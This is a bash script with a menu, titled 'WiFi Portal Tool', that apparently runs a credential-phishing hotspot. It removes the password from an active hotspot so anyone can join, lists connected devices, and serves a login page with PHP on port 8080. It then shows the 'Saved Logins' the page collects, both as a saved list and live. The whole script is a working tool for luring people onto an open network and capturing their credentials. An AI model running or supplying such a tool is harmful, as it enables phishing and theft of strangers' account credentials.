#!/bin/bash

PORTAL_DIR="portal"
LOG_FILE="logs/log.txt"
HOTSPOT_IFACE="wlp4s0"

# ---------------------------
# Detect existing hotspot and remove password
# ---------------------------
make_hotspot_open() {
    ACTIVE_HOTSPOT=$(nmcli -t -f NAME,TYPE,DEVICE connection show --active | grep ":wifi:$HOTSPOT_IFACE" | cut -d: -f1)
    if [ -z "$ACTIVE_HOTSPOT" ]; then
        echo "[!] No active hotspot detected on $HOTSPOT_IFACE."
        return 1
    fi

    echo "[+] Hotspot detected: $ACTIVE_HOTSPOT. Removing password..."
    # Set open network
    nmcli connection modify "$ACTIVE_HOTSPOT" 802-11-wireless-security.key-mgmt none
    nmcli connection up "$ACTIVE_HOTSPOT"
    echo "[+] Hotspot is now open."
}

# ---------------------------
# Show connected devices
# ---------------------------
show_connected_devices() {
    echo "[+] Connected devices:"
    arp -n | grep -v "incomplete"
}

# ---------------------------
# Start login page server
# ---------------------------
start_server() {
    if [ ! -d "$PORTAL_DIR" ]; then
        echo "[-] Portal directory '$PORTAL_DIR' does not exist!"
        return
    fi
    echo "[+] Starting portal server..."
    cd "$PORTAL_DIR" || exit
    php -S 0.0.0.0:8080
}

# ---------------------------
# View saved logins
# ---------------------------
view_logs() {
    echo "---- Saved Logins ----"
    if [ -f "$LOG_FILE" ]; then
        cat "$LOG_FILE"
    else
        echo "No logs yet."
    fi
    echo "----------------------"
}

# ---------------------------
# Live logs
# ---------------------------
live_logs() {
    echo "[+] Live log view (Ctrl+C to exit)"
    if [ ! -f "$LOG_FILE" ]; then
        touch "$LOG_FILE"
    fi
    tail -f "$LOG_FILE"
}

# ---------------------------
# Edit login page
# ---------------------------
edit_page() {
    if [ ! -f "$PORTAL_DIR/index.html" ]; then
        echo "[-] Login page does not exist!"
        return
    fi
    nano "$PORTAL_DIR/index.html"
}

# ---------------------------
# Setup folders/files
# ---------------------------
setup() {
    echo "[+] Setting up folders..."
    mkdir -p "$PORTAL_DIR" logs
    touch "$LOG_FILE"
    chmod 666 "$LOG_FILE"
    echo "[+] Setup complete!"
}

# ---------------------------
# Main Menu
# ---------------------------
while true; do
    echo ""
    echo "====== WiFi Portal Tool ======"
    echo "1) Setup (first time)"
    echo "2) Make Existing Hotspot Open"
    echo "3) Show Connected Devices"
    echo "4) Start Login Page Server"
    echo "5) View Saved Logins"
    echo "6) Live View Logs"
    echo "7) Edit Login Page"
    echo "8) Exit"
    echo "=============================="
    read -p "Select option: " choice

    case $choice in
        1) setup ;;
        2) make_hotspot_open ;;
        3) show_connected_devices ;;
        4) start_server ;;
        5) view_logs ;;
        6) live_logs ;;
        7) edit_page ;;
        8) echo "Exiting..."; exit ;;
        *) echo "Invalid option" ;;
    esac
done
